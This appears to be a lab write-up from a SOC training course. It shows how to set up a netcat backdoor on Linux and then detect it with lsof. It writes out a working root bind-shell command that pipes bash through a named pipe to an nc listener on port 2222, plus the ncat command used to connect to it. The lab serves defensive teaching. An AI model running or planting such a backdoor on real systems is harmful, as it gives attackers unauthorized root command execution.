# "Linux CLI Malware Detection: Netcat Backdoor

This lab is provided by Antisyphon Training's SOC Core Skills course. We will explore the setup and detection of backdoor malware using a netcat listener, a common tool for establishing unauthorized remote access. The exercise aims to simulate a real-world cyber threat scenario, providing hands-on experience in malware analysis and defense techniques. By leveraging the Linux Command Line Interface (CLI), we will detect and analyze the backdoor. 
<br>

## Create the malware 
- We will first sudo into root so that we can have a backdoor running root.
```
sudo su -
```
<br>
<br>

- This is a simple backdoor mechanism that uses netcat to create a network listener that pipes commands to and from a bash shell, allowing an attacker to remotely execute commands on the system by connecting to port 2222. 
```
mknod backpipe p
/bin/bash  0<backpipe | nc -l 2222 1>backpipe
```
<br>

![backdoor](https://github.com/trixiahorner/Linux_CLI/assets/162903587/d9187608-208a-4da0-99d3-70435d6ef994)
<br>
<br>

- We need the IP of our linux system so that we can connect
```
ifconfig
```
<br>
<br>

- Now let's connect from our windows system! Once connected, we can type some commands to ensure that it is working. As you can see, our Windows computer is connected to the simple Linux backdoor as root. This is the malware. Someone is listening.
```
ncat 172.17.231.122 2222
```
<br>

![netcat](https://github.com/trixiahorner/Linux_CLI/blob/main/images/C2.png?raw=true)
<br>
<br>

## Linux CLI Analysis of malware
- Now we will start our analysis from the Linux CLI. Let's hunt and find our malware. Open up a window for analysis.
```
sudo su -
```
<br>
<br>

- Using lsof we can see a listening device and an established connection
```
lsof -i -P
```
<br>

![netcat](https://github.com/trixiahorner/Linux_CLI/blob/main/images/C3.png?raw=true)
<br>
<br>

- We can look at the netcat process ID using the -p option. This will give us all the open files associated with the listed process ID (the netcat listener)
```
lsof -p 203
```
<br>

![netcat](https://github.com/trixiahorner/Linux_CLI/blob/main/images/C4.png?raw=true)
<br>
<br>



# Conclusion
This lab is crucial for understanding the behavior of backdoor malware and the methodologies used to identify and respond to such threats effectively.
